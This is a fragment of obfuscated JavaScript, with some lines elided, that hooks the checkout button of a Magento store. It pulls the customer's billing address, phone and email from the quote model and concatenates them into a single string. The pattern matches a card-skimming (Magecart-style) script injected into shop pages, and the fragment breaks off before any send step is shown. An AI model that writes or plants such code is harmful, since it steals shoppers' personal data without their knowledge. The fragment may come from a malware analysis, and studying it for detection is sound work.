document.body.addEventListener("click", function(event) {
    ...
    if (checkoutButton && !checkoutButton.dataset.clicked) {
        ...
        setTimeout(() => checkoutButton.removeAttribute("data-clicked"), 2000); 

        try {
            require([
                'Magento_Checkout/js/model/quote'
            ], function(quote) {
                const gjh23lkd = quote.billingAddress();
                if (!gjh23lkd) {
                    return;
                }

                const email = quote.guestEmail || quote.customerEmail || "N/A"; // Fallback to "N/A" if no email is found
                ...
                const xmvs9dp = gjh23lkd.region || 'Please select region, state or province';
                const w4jhk5z = gjh23lkd.postcode;
                const wmpd96r = gjh23lkd.countryId;
                ...
                const n3qkj20f = `Name:${zlfqwz} | Address:${qnxzsd} | Address2:${prwg54z} | City:${i4rts7l} | State:${xmvs9dp} | Zip:${w4jhk5z} | Country:${wmpd96r} | Phone:${kjf98b6} | email:${email} | From:${zf1p9ko} | ${t1x9z7l}`;
